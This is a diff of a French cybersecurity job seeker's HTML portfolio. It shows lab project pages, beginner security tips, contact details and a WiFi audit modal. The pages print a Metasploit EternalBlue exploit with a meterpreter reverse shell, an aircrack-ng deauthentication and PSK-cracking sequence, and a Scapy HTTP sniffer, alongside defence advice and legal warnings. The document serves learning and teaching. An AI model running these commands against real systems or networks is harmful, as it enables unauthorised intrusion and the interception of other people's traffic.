-                                <li>• IDS/IPS pour réseaux professionnels</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- صفحة تفصيلية للبيئة الآمنة -->
-        <div id="test-environment" class="project-detail-page">
-            <div class="project-header">
-                <div class="container mx-auto px-6">
-                    <button class="back-btn" onclick="showPage('projects')">
-                        <i class="fas fa-arrow-left mr-2"></i>Retour aux Projets
-                    </button>
-                    <h1 class="text-4xl md:text-5xl font-bold mb-4">Environnement de Test Sécurisé</h1>
-                    <p class="text-xl text-gray-300">Configuration d'un laboratoire virtuel pour tests de sécurité</p>
-                </div>
-            </div>
-
-            <div class="project-detail-content">
-                <div class="grid md:grid-cols-2 gap-8">
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-green-400">
-                            <i class="fas fa-server mr-2"></i>Configuration
-                        </h3>
-                        <ul class="feature-list">
-                            <li>Machine virtuelle Kali Linux</li>
-                            <li>Réseau interne isolé</li>
-                            <li>Machines cibles Windows 10/11</li>
-                            <li>Machine cible Linux (Metasploitable)</li>
-                            <li>Outils de test pré-installés</li>
-                        </ul>
-                    </div>
-
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-yellow-400">
-                            <i class="fas fa-tools mr-2"></i>Outils Utilisés
-                        </h3>
-                        <div class="tech-stack">
-                            <span class="tech-badge">VirtualBox</span>
-                            <span class="tech-badge">VMware</span>
-                            <span class="tech-badge">Kali Linux</span>
-                            <span class="tech-badge">Metasploit</span>
-                            <span class="tech-badge">Nmap</span>
-                            <span class="tech-badge">Hydra</span>
-                            <span class="tech-badge">John the Ripper</span>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="project-section">
-                    <h3 class="text-2xl font-bold mb-4 text-blue-400">
-                        <i class="fas fa-cogs mr-2"></i>Fonctionnalités Implémentées
-                    </h3>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Tests de Pénétration</h4>
-                            <ul class="text-gray-300">
-                                <li>• <strong>Metasploit</strong> : Tests de vulnérabilités</li>
-                                <li>• <strong>Nmap</strong> : Scan de ports et services</li>
-                                <li>• <strong>Hydra</strong> : Attaques par force brute</li>
-                                <li>• <strong>SQLmap</strong> : Tests injection SQL</li>
-                                <li>• <strong>Burp Suite</strong> : Tests web applications</li>
-                                <li>• <strong>Wireshark</strong> : Analyse réseau</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Environnement Isolé</h4>
-                            <ul class="text-gray-300">
-                                <li>• Réseau NAT privé virtuel</li>
-                                <li>• Machines cibles configurables</li>
-                                <li>• Snapshots pour restaurations</li>
-                                <li>• Documentation des tests</li>
-                                <li>• Journal d'activités</li>
-                                <li>• Tests légaux uniquement</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="demo-section">
-                    <h3 class="text-2xl font-bold mb-4 text-red-400">
-                        <i class="fas fa-code mr-2"></i>Exemples de Commandes Metasploit
-                    </h3>
-                    <div class="code-snippet">
-                        # Lancer Metasploit<br>
-                        msfconsole<br><br>
-                        
-                        # Rechercher une vulnérabilité<br>
-                        search eternalblue<br><br>
-                        
-                        # Utiliser un module d'exploit<br>
-                        use exploit/windows/smb/ms17_010_eternalblue<br><br>
-                        
-                        # Configurer les options<br>
-                        set RHOSTS 192.168.1.100<br>
-                        set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>
-                        set LHOST 192.168.1.50<br><br>
-                        
-                        # Lancer l'exploit<br>
-                        exploit<br><br>
-                        
-                        # Commandes Meterpreter après connexion<br>
-                        sysinfo           # Info système<br>
-                        shell            # Ouvrir shell<br>
-                        download file.txt # Télécharger fichier<br>
-                        upload file.txt  # Uploader fichier
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- صفحة تفصيلية لتحليل البروتوكولات -->
-        <div id="protocol-analysis" class="project-detail-page">
-            <div class="project-header">
-                <div class="container mx-auto px-6">
-                    <button class="back-btn" onclick="showPage('projects')">
-                        <i class="fas fa-arrow-left mr-2"></i>Retour aux Projets
-                    </button>
-                    <h1 class="text-4xl md:text-5xl font-bold mb-4">Analyse de Protocoles</h1>
-                    <p class="text-xl text-gray-300">Étude des protocoles réseau et détection de vulnérabilités</p>
-                </div>
-            </div>
-
-            <div class="project-detail-content">
-                <div class="grid md:grid-cols-3 gap-8 mb-8">
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-red-400">
-                            <i class="fas fa-info-circle mr-2"></i>Description
-                        </h3>
-                        <p class="text-gray-300">
-                            Analyse approfondie des protocoles réseau pour comprendre leur fonctionnement 
-                            et identifier les potentielles vulnérabilités de sécurité.
-                        </p>
-                    </div>
-
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-blue-400">
-                            <i class="fas fa-cogs mr-2"></i>Protocoles Étudiés
-                        </h3>
-                        <div class="tech-stack">
-                            <span class="tech-badge">HTTP/HTTPS</span>
-                            <span class="tech-badge">TCP/UDP</span>
-                            <span class="tech-badge">SSH</span>
-                            <span class="tech-badge">DNS</span>
-                            <span class="tech-badge">FTP</span>
-                            <span class="tech-badge">SMTP</span>
-                        </div>
-                    </div>
-
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-green-400">
-                            <i class="fas fa-calendar mr-2"></i>Durée
-                        </h3>
-                        <p class="text-gray-300 text-xl">4 semaines</p>
-                        <p class="text-gray-400">Analyse et documentation</p>
-                    </div>
-                </div>
-
-                <div class="project-section">
-                    <h3 class="text-2xl font-bold mb-4 text-purple-400">
-                        <i class="fas fa-network-wired mr-2"></i>Outils d'Analyse Principaux
-                    </h3>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Wireshark</h4>
-                            <ul class="text-gray-300">
-                                <li>• Analyse de traffic réseau en temps réel</li>
-                                <li>• Filtrage par protocole, IP, port</li>
-                                <li>• Décodage de paquets chiffrés (si clés disponibles)</li>
-                                <li>• Détection de patterns suspects</li>
-                                <li>• Export de données pour analyse</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Python + Scapy</h4>
-                            <ul class="text-gray-300">
-                                <li>• Création de paquets personnalisés</li>
-                                <li>• Tests de vulnérabilités</li>
-                                <li>• Automatisation d'analyses</li>
-                                <li>• Scripts pour tests spécifiques</li>
-                                <li>• Intégration avec autres outils</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="demo-section">
-                    <h3 class="text-2xl font-bold mb-4 text-yellow-400">
-                        <i class="fas fa-code mr-2"></i>Exemple Wireshark + Python
-                    </h3>
-                    <div class="code-snippet">
-                        # Analyse avec Wireshark<br>
-                        wireshark -i eth0 -f "tcp port 80 or tcp port 443"<br><br>
-                        
-                        # Filtres communs Wireshark :<br>
-                        http.request   # Requêtes HTTP<br>
-                        tls.handshake  # Handshakes TLS<br>
-                        dns            # Requêtes DNS<br>
-                        ssh            # Connexions SSH<br><br>
-                        
-                        # Script Python avec Scapy :<br>
-                        from scapy.all import *<br><br>
-                        
-                        # Sniffer les paquets HTTP<br>
-                        def http_sniffer(packet):<br>
-                        &nbsp;&nbsp;if packet.haslayer(TCP) and packet.haslayer(Raw):<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;load = packet[Raw].load<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;if b"GET" in load or b"POST" in load:<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"HTTP Request: {load[:100]}")<br><br>
-                        
-                        # Démarrer le sniffing<br>
-                        sniff(filter="tcp port 80", prn=http_sniffer, store=0)
-                    </div>
-                </div>
-
-                <div class="project-section mt-6">
-                    <h3 class="text-2xl font-bold mb-4 text-green-400">
-                        <i class="fas fa-shield-alt mr-2"></i>Vulnérabilités Courantes
-                    </h3>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">HTTP/HTTPS</h4>
-                            <ul class="text-gray-300">
-                                <li>• Mixed Content (HTTP dans HTTPS)</li>
-                                <li>• Certificats auto-signés</li>
-                                <li>• Weak cipher suites</li>
-                                <li>• Information leakage en headers</li>
-                                <li>• Cookies non sécurisés</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">SSH</h4>
-                            <ul class="text-gray-300">
-                                <li>• Password authentication only</li>
-                                <li>• Weak algorithms</li>
-                                <li>• Root login autorisé</li>
-                                <li>• Version disclosure</li>
-                                <li>• Brute force possible</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- صفحة مشروع VeraCrypt -->
-        <div id="veracrypt" class="project-detail-page">
-            <div class="project-header">
-                <div class="container mx-auto px-6">
-                    <button class="back-btn" onclick="showPage('projects')">
-                        <i class="fas fa-arrow-left mr-2"></i>Retour aux Projets
-                    </button>
-                    <h1 class="text-4xl md:text-5xl font-bold mb-4">Chiffrement PC avec VeraCrypt</h1>
-                    <p class="text-xl text-gray-300">Chiffrement complet du disque dur pour protéger les données sensibles</p>
-                </div>
-            </div>
-
-            <div class="project-detail-content">
-                <div class="grid md:grid-cols-3 gap-8 mb-8">
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-green-400">
-                            <i class="fas fa-info-circle mr-2"></i>Description
-                        </h3>
-                        <p class="text-gray-300">
-                            Implémentation d'un chiffrement complet du disque dur avec VeraCrypt pour sécuriser 
-                            toutes les données contre l'accès non autorisé, même en cas de vol du PC.
-                        </p>
-                    </div>
-
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-blue-400">
-                            <i class="fas fa-cogs mr-2"></i>Technologies
-                        </h3>
-                        <div class="tech-stack">
-                            <span class="tech-badge">VeraCrypt</span>
-                            <span class="tech-badge">AES-256</span>
-                            <span class="tech-badge">Serpent</span>
-                            <span class="tech-badge">Twofish</span>
-                            <span class="tech-badge">Windows/Linux</span>
-                        </div>
-                    </div>
-
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-yellow-400">
-                            <i class="fas fa-calendar mr-2"></i>Durée
-                        </h3>
-                        <p class="text-gray-300 text-xl">1 semaine</p>
-                        <p class="text-gray-400">Configuration et tests</p>
-                    </div>
-                </div>
-
-                <div class="project-section">
-                    <h3 class="text-2xl font-bold mb-4 text-purple-400">
-                        <i class="fas fa-lock mr-2"></i>Processus de Chiffrement
-                    </h3>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Étape 1 : Préparation</h4>
-                            <ul class="text-gray-300">
-                                <li>• Sauvegarde complète des données</li>
-                                <li>• Téléchargement VeraCrypt officiel</li>
-                                <li>• Vérification checksum SHA256</li>
-                                <li>• Création USB de récupération</li>
-                                <li>• Batterie PC chargée à 100%</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Étape 2 : Configuration</h4>
-                            <ul class="text-gray-300">
-                                <li>• Choix algorithme : AES-256</li>
-                                <li>• Hash algorithm : SHA-512</li>
-                                <li>• Chiffrement système complet</li>
-                                <li>• Mot de passe fort (>20 caractères)</li>
-                                <li>• Keyfile optionnel (USB)</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Étape 3 : Chiffrement</h4>
-                            <ul class="text-gray-300">
-                                <li>• Démarrage du processus</li>
-                                <li>• 4-8 heures selon taille disque</li>
-                                <li>• Ne pas éteindre le PC !</li>
-                                <li>• Tests de boot après fin</li>
-                                <li>• Vérification données</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">Étape 4 : Maintenance</h4>
-                            <ul class="text-gray-300">
-                                <li>• Mise à jour VeraCrypt régulière</li>
-                                <li>• Changement mot de passe périodique</li>
-                                <li>• Backup keyfile/USB récupération</li>
-                                <li>• Monitoring performances</li>
-                                <li>• Documentation procédure</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="demo-section">
-                    <h3 class="text-2xl font-bold mb-4 text-red-400">
-                        <i class="fas fa-shield-alt mr-2"></i>Avantages du Chiffrement
-                    </h3>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">🔒 Sécurité</h4>
-                            <ul class="text-gray-300">
-                                <li>• Données illisibles sans mot de passe</li>
-                                <li>• Protection contre vol physique</li>
-                                <li>• Prévention data breach</li>
-                                <li>• Conformité RGPD (données sensibles)</li>
-                                <li>• Protection contre ransomware</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">⚡ Performance</h4>
-                            <ul class="text-gray-300">
-                                <li>• Impact minimal sur performances (1-5%)</li>
-                                <li>• Compatible tous systèmes</li>
-                                <li>• Transparent pour utilisateur</li>
-                                <li>• Hardware acceleration support</li>
-                                <li>• Multi-algorithmes disponibles</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="project-section">
-                    <h3 class="text-2xl font-bold mb-4 text-blue-400">
-                        <i class="fas fa-exclamation-triangle mr-2"></i>Précautions Importantes
-                    </h3>
-                    <ul class="text-gray-300 space-y-3">
-                        <li><strong>⚠️ NE PAS PERDRE LE MOT DE PASSE :</strong> Données perdues définitivement</li>
-                        <li><strong>⚠️ BACKUP AVANT TOUT :</strong> Sauvegarde complète obligatoire</li>
-                        <li><strong>⚠️ ALIMENTATION STABLE :</strong> Ne pas éteindre pendant chiffrement</li>
-                        <li><strong>⚠️ USB RÉCUPÉRATION :</strong> À garder en lieu sûr</li>
-                        <li><strong>⚠️ TEST DE BOOT :</strong> Vérifier que tout fonctionne après</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-
-        <!-- صفحة نصائح الأمان للمبتدئين -->
-        <div id="security-tips" class="project-detail-page">
-            <div class="project-header">
-                <div class="container mx-auto px-6">
-                    <button class="back-btn" onclick="showPage('projects')">
-                        <i class="fas fa-arrow-left mr-2"></i>Retour aux Projets
-                    </button>
-                    <h1 class="text-4xl md:text-5xl font-bold mb-4">Conseils Sécurité Débutants</h1>
-                    <p class="text-xl text-gray-300">Guide pratique pour se protéger des attaques courantes</p>
-                </div>
-            </div>
-
-            <div class="project-detail-content">
-                <div class="grid md:grid-cols-2 gap-8">
-                    <!-- WiFi Security -->
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-red-400">
-                            <i class="fas fa-wifi mr-2"></i>Comment on pirate un WiFi ?
-                        </h3>
-                        <p class="text-gray-300 mb-4">
-                            Les pirates utilisent Kali Linux avec des commandes comme :
-                        </p>
-                        <div class="code-snippet">
-                            # Voir les interfaces réseau<br>
-                            iwconfig<br><br>
-                            
-                            # Activer le mode monitor<br>
-                            sudo airmon-ng start wlan0<br><br>
-                            
-                            # Voir les réseaux WiFi autour<br>
-                            sudo airodump-ng wlan0mon<br><br>
-                            
-                            # Capturer le handshake WPA<br>
-                            sudo airodump-ng -c {canal} --bssid {MAC} -w capture wlan0mon<br><br>
-                            
-                            # Désauthentifier un client<br>
-                            sudo aireplay-ng --deauth 0 -a {MAC} wlan0mon<br><br>
-                            
-                            # Cracker le mot de passe<br>
-                            sudo aircrack-ng -w wordlist.txt -b {MAC} capture*.cap
-                        </div>
-                        <div class="mt-4 p-4 bg-red-900 bg-opacity-30 rounded-lg">
-                            <h4 class="text-lg font-bold text-white mb-2">🛡️ Comment se protéger :</h4>
-                            <ul class="text-gray-300 space-y-1">
-                                <li>• Utiliser WPA3 ou WPA2 AES (pas WEP!)</li>
-                                <li>• Mot de passe long (>12 caractères) avec chiffres/symboles</li>
-                                <li>• Désactiver WPS</li>
-                                <li>• Changer le mot de passe admin du routeur</li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <!-- Phishing Protection -->
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-yellow-400">
-                            <i class="fas fa-fish mr-2"></i>Comment éviter le Phishing ?
-                        </h3>
-                        <p class="text-gray-300 mb-4">
-                            Le phishing c'est quand on te fait cliquer sur un lien faux qui ressemble à un vrai site.
-                        </p>
-                        
-                        <div class="bg-yellow-900 bg-opacity-30 p-4 rounded-lg mb-4">
-                            <h4 class="text-lg font-bold text-white mb-2">⚠️ Comment te protéger :</h4>
-                            <ul class="text-gray-300 space-y-2">
-                                <li>• <strong>NE JAMAIS CLICKER</strong> sur un lien reçu par SMS/email</li>
-                                <li>• Vérifier l'URL : "amaz0n.com" ≠ "amazon.com"</li>
-                                <li>• Chercher le cadenas 🔒 HTTPS</li>
-                                <li>• Si on te demande tes infos perso, c'est suspect</li>
-                                <li>• Contacter directement le service (pas par le lien)</li>
-                            </ul>
-                        </div>
-
-                        <div class="code-snippet">
-                            # Exemple d'URL suspecte :<br>
-                            - amazon-login-secure.com (FAUX)<br>
-                            - paypal-verification.net (FAUX)<br>
-                            - facebook.connexion.fr (FAUX)<br><br>
-                            
-                            # Toujours taper toi-même :<br>
-                            - amazon.fr<br>
-                            - paypal.com<br>
-                            - facebook.com
-                        </div>
-                    </div>
-
-                    <!-- Comment on peut te hacker -->
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-purple-400">
-                            <i class="fas fa-user-secret mr-2"></i>Comment on peut te hacker ?
-                        </h3>
-                        <ul class="text-gray-300 space-y-3">
-                            <li><strong>1. Social Engineering :</strong> On te manipule pour avoir tes infos</li>
-                            <li><strong>2. Mot de passe faible :</strong> "123456" se crack en 1 seconde</li>
-                            <li><strong>3. WiFi public non sécurisé :</strong> On peut voir tout ce que tu fais</li>
-                            <li><strong>4. Logiciels pas à jour :</strong> Failles connues = porte ouverte</li>
-                            <li><strong>5. USB trouvé par terre :</strong> Peut contenir un virus</li>
-                        </ul>
-                        
-                        <div class="mt-6 p-4 bg-purple-900 bg-opacity-30 rounded-lg">
-                            <h4 class="text-lg font-bold text-white mb-2">✅ Règles d'or :</h4>
-                            <ul class="text-gray-300 space-y-1">
-                                <li>• 2FA (Authentification Double Facteur) TOUJOURS activé</li>
-                                <li>• Mots de passe UNIQUES pour chaque site</li>
-                                <li>• Mettre à jour tes apps/système</li>
-                                <li>• Ne pas brancher d'USB inconnu</li>
-                                <li>• Faire attention aux demandes "urgentes"</li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <!-- Outils Utiles -->
-                    <div class="project-section">
-                        <h3 class="text-2xl font-bold mb-4 text-blue-400">
-                            <i class="fas fa-tools mr-2"></i>Outils Utiles (Linux)
-                        </h3>
-                        <div class="code-snippet">
-                            # Voir ta connexion réseau :<br>
-                            ifconfig<br>
-                            ip a<br><br>
-                            
-                            # Voir les processus réseau :<br>
-                            netstat -tulpn<br><br>
-                            
-                            # Tester la connectivité :<br>
-                            ping google.com<br>
-                            traceroute google.com<br><br>
-                            
-                            # Analyser le traffic :<br>
-                            tcpdump -i eth0<br>
-                            tcpdump -i wlan0 -n -s0<br><br>
-                            
-                            # Voir les connexions actives :<br>
-                            ss -tunap<br><br>
-                            
-                            # Scanner les ports (local) :<br>
-                            nmap -sS -sV localhost<br>
-                            nmap -p 1-1000 192.168.1.1
-                        </div>
-                        
-                        <div class="mt-4 p-4 bg-blue-900 bg-opacity-30 rounded-lg">
-                            <h4 class="text-lg font-bold text-white mb-2">💡 Astuces :</h4>
-                            <ul class="text-gray-300 space-y-1">
-                                <li>• <code>iwconfig</code> : voir info WiFi</li>
-                                <li>• <code>airmon-ng</code> : mode monitor pour analyse WiFi</li>
-                                <li>• <code>airodump-ng</code> : capturer réseaux WiFi</li>
-                                <li>• <code>aireplay-ng</code> : tests de sécurité WiFi</li>
-                                <li>• Toujours avec <code>sudo</code> pour les outils réseau</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="project-section mt-8">
-                    <h3 class="text-2xl font-bold mb-4 text-green-400">
-                        <i class="fas fa-lightbulb mr-2"></i>Pour les Débutants Complets
-                    </h3>
-                    <div class="grid md:grid-cols-2 gap-6">
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">🛡️ Par où commencer ?</h4>
-                            <ul class="text-gray-300 space-y-2">
-                                <li>1. Installer VirtualBox + Kali Linux (machine virtuelle)</li>
-                                <li>2. Apprendre les commandes Linux de base</li>
-                                <li>3. Comprendre TCP/IP et les ports</li>
-                                <li>4. Tester sur ton propre réseau (légal!)</li>
-                                <li>5. Faire des labs TryHackMe gratuit</li>
-                            </ul>
-                        </div>
-                        <div>
-                            <h4 class="text-lg font-bold mb-2 text-white">📚 Ressources Gratuites</h4>
-                            <ul class="text-gray-300 space-y-2">
-                                <li>• TryHackMe (free rooms)</li>
-                                <li>• OverTheWire (Bandit wargame)</li>
-                                <li>• YouTube : NetworkChuck, John Hammond</li>
-                                <li>• Documentation Kali Linux</li>
-                                <li>• Ma chaîne Instagram pour conseils</li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Page Contact -->
-        <div id="contact" class="portfolio-page">
-            <section class="py-20">
-                <div class="container mx-auto px-6">
-                    <div class="contact-header">
-                        <h2>CONTACTEZ-MOI</h2>
-                        <p>En recherche d'un poste de Technicien Cybersécurité Junior ou d'une formation TSSR<br>
-                        Ouvert aux stages, contrats d'alternance ou CDI junior</p>
-                    </div>
-
-                    <div class="contact-grid">
-                        <div class="contact-card p-8">
-                            <h3 class="text-2xl font-bold mb-6 text-red-400">
-                                <i class="fas fa-comments mr-2"></i>Coordonnées
-                            </h3>
-                            
-                            <div class="space-y-6">
-                                <div class="contact-item p-4 flex items-center">
-                                    <div class="w-12 h-12 rounded-full bg-gradient-to-r from-red-500 to-yellow-500 flex items-center justify-center mr-4">
-                                        <i class="fas fa-envelope text-white"></i>
-                                    </div>
-                                    <div>
-                                        <div class="text-gray-400 text-sm">Email</div>
-                                        <div class="text-white font-medium">e.oubenmoussa@gmail.com</div>
-                                    </div>
-                                </div>
-                                
-                                <div class="contact-item p-4 flex items-center">
-                                    <div class="w-12 h-12 rounded-full bg-gradient-to-r from-blue-500 to-cyan-400 flex items-center justify-center mr-4">
-                                        <i class="fas fa-phone text-white"></i>
-                                    </div>
-                                    <div>
-                                        <div class="text-gray-400 text-sm">Téléphone</div>
-                                        <div class="text-white font-medium">+33 6 59 25 55 58</div>
-                                    </div>
-                                </div>
-                                
-                                <div class="contact-item p-4 flex items-center">
-                                    <div class="w-12 h-12 rounded-full bg-gradient-to-r from-green-500 to-emerald-400 flex items-center justify-center mr-4">
-                                        <i class="fas fa-map-marker-alt text-white"></i>
-                                    </div>
-                                    <div>
-                                        <div class="text-gray-400 text-sm">Adresse</div>
-                                        <div class="text-white font-medium">7 Rue des Tanneurs, Béziers, France</div>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <div class="mt-8 space-y-4">
-                                <a href="mailto:e.oubenmoussa@gmail.com" class="w-full bg-gradient-to-r from-red-500 to-pink-500 text-white font-bold py-3 px-6 rounded-full hover:from-red-600 hover:to-pink-600 transition-all duration-300 transform hover:-translate-y-1 shadow-lg flex items-center justify-center">
-                                    <i class="fas fa-envelope mr-2"></i>Envoyer un Email
-                                </a>
-                                <a href="tel:+33659255558" class="w-full bg-gradient-to-r from-blue-500 to-cyan-500 text-white font-bold py-3 px-6 rounded-full hover:from-blue-600 hover:to-cyan-600 transition-all duration-300 transform hover:-translate-y-1 shadow-lg flex items-center justify-center">
-                                    <i class="fas fa-phone mr-2"></i>Appeler Maintenant
-                                </a>
-                            </div>
-                        </div>
-
-                        <div class="space-y-6">
-                            <div class="service-card">
-                                <div class="service-icon">
-                                    <i class="fas fa-graduation-cap"></i>
-                                </div>
-                                <h4 class="text-xl font-bold mb-2 text-white">Recherche de Poste</h4>
-                                <p class="text-gray-300">Je cherche un poste de Technicien Cybersécurité Junior</p>
-                            </div>
-
-                            <div class="service-card">
-                                <div class="service-icon">
-                                    <i class="fas fa-briefcase"></i>
-                                </div>
-                                <h4 class="text-xl font-bold mb-2 text-white">Stage Découverte</h4>
-                                <p class="text-gray-300">Ouvert à un stage pour découvrir le milieu professionnel</p>
-                            </div>
-
-                            <div class="service-card">
-                                <div class="service-icon">
-                                    <i class="fas fa-users"></i>
-                                </div>
-                                <h4 class="text-xl font-bold mb-2 text-white">Accompagnement</h4>
-                                <p class="text-gray-300">Actuellement accompagné par Mission Locale et France Travail</p>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="social-section">
-                        <h3 class="text-2xl font-bold mb-4 text-yellow-400">Réseaux Sociaux</h3>
-                        <p class="text-gray-300 mb-6">N'hésitez pas à me suivre sur mes réseaux</p>
-                        
-                        <div class="social-links">
-                            <a href="https://www.instagram.com/thor_finne/" class="social-link instagram">
-                                <i class="fab fa-instagram"></i>
-                                <span>Instagram</span>
-                            </a>
-                        </div>
-                    </div>
-                </div>
-            </section>
-        </div>
+    <div class="modal-section">
+      <h4>Stack utilisée</h4>
+      <div class="modal-stack">
+        <span class="pill">Kali Linux</span>
+        <span class="pill">aircrack-ng</span>
+        <span class="pill">airodump-ng</span>
+        <span class="pill">aireplay-ng</span>
+        <span class="pill">Wireshark</span>
+      </div>
     </div>
 
-    <script>
-        // الكود الجديد - ساهل وبسيط
-        const bulb = document.getElementById("bulb");
-        const loginPages = document.getElementById("loginPages");
-        const loginContainer = document.getElementById("loginContainer");
-        const portfolioSection = document.getElementById("portfolioSection");
-        const lightEffect = document.getElementById("lightEffect");
-        const hint = document.getElementById("hint");
+    <div class="modal-section">
+      <h4>Procédure type</h4>
+      <div class="code-block" data-label="wifi-audit.sh">
+<span class="cmt"># Activer le mode monitor</span>
+<span class="cmd">sudo airmon-ng</span> start wlan0
 
-        // تكليك على اللمبة
-        bulb.addEventListener('click', function() {
-            // غير اللون ديال اللمبة
-            bulb.classList.remove("bulb-off");
-            bulb.classList.add("bulb-on");
-            
-            // غير الفتيلة
-            document.getElementById("coil1").classList.remove("filament-off");
-            document.getElementById("coil1").classList.add("filament-on");
-            document.getElementById("coil2").classList.remove("filament-off");
-            document.getElementById("coil2").classList.add("filament-on");
-            
-            // وري الضوء
-            lightEffect.classList.add("on");
-            
-            // وري فورم التسجيل
-            loginPages.style.opacity = "1";
-            loginPages.style.pointerEvents = "all";
-            
-            // خبي التلميح
-            hint.style.opacity = "0";
-        });
+<span class="cmt"># Scanner les réseaux à proximité</span>
+<span class="cmd">sudo airodump-ng</span> wlan0mon
 
-        // دالة التسجيل
-        function loginToPortfolio() {
-            const username = document.getElementById('username1').value;
-            const password = document.getElementById('password1').value;
-            
-            if (username && password) {
-                loginContainer.style.display = 'none';
-                portfolioSection.style.display = 'block';
-            } else {
-                alert('⚠️ Veuillez remplir tous les champs!');
-            }
-        }
+<span class="cmt"># Cibler un AP — capturer le handshake</span>
+<span class="cmd">sudo airodump-ng</span> -c 6 --bssid &lt;MAC&gt; -w cap wlan0mon
 
-        // دالة تبديل الصفحات
-        function showPage(pageId) {
-            // إخفاء جميع الصفحات
-            document.querySelectorAll('.portfolio-page').forEach(page => {
-                page.classList.remove('active');
-            });
-            
-            // إخفاء صفحات التفاصيل
-            document.querySelectorAll('.project-detail-page').forEach(page => {
-                page.classList.remove('active');
-            });
-            
-            // عرض الصفحة المطلوبة
-            document.getElementById(pageId).classList.add('active');
-            
-            // تحديث الأزرار
-            document.querySelectorAll('.nav-btn').forEach(btn => {
-                btn.classList.remove('active');
-            });
-            
-            // إضافة active للزر المناسب
-            const activeBtn = document.querySelector(`.nav-btn[onclick="showPage('${pageId}')"]`);
-            if (activeBtn) {
-                activeBtn.classList.add('active');
-            }
-        }
+<span class="cmt"># Forcer une réauth pour accélérer la capture</span>
+<span class="cmd">sudo aireplay-ng</span> --deauth 5 -a &lt;MAC&gt; wlan0mon
 
-        // دالة عرض صفحة تفاصيل المشروع
-        function showProjectDetail(projectId) {
-            // إخفاء جميع الصفحات
-            document.querySelectorAll('.portfolio-page').forEach(page => {
-                page.classList.remove('active');
-            });
-            
-            // إخفاء صفحات التفاصيل
-            document.querySelectorAll('.project-detail-page').forEach(page => {
-                page.classList.remove('active');
-            });
-            
-            // عرض صفحة التفاصيل المطلوبة
-            const projectPage = document.getElementById(projectId);
-            if (projectPage) {
-                projectPage.classList.add('active');
-            } else {
-                console.error('Page de projet non trouvée:', projectId);
-                // إذا لم توجد الصفحة، العودة إلى صفحة المشاريع
-                showPage('projects');
-            }
-        }
+<span class="cmt"># Tenter la cassure du PSK</span>
+<span class="cmd">aircrack-ng</span> -w rockyou.txt -b &lt;MAC&gt; cap*.cap
+      </div>
+    </div>
 
-        // تفعيل الرسوم المتحركة للعناصر
-        const observerOptions = {
-            threshold: 0.1,
-            rootMargin: '0px 0px -50px 0px'
-        };
+    <div class="modal-section">
+      <h4>Mesures de défense</h4>
+      <ul>
+        <li>Migrer vers WPA3 ou WPA2-AES exclusivement</li>
+        <li>Mot de passe ≥ 14 caractères avec entropie élevée</li>
+        <li>Désactiver WPS (vulnérable par design)</li>
+        <li>Changer les credentials admin par défaut du routeur</li>
+        <li>Activer la journalisation des connexions</li>
+      </ul>
+    </div>
 
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.style.opacity = '1';
-                    entry.target.style.transform = 'translateY(0)';
-                }
-            });
-        }, observerOptions);
+    <div class="warn-box">
+      <strong>⚠ Note légale.</strong> Toutes les manipulations ont été réalisées sur un réseau personnel dédié. L'audit WiFi sans autorisation est un délit.
+    </div>
+  </div>
+</div>
 
-        document.addEventListener('DOMContentLoaded', function() {
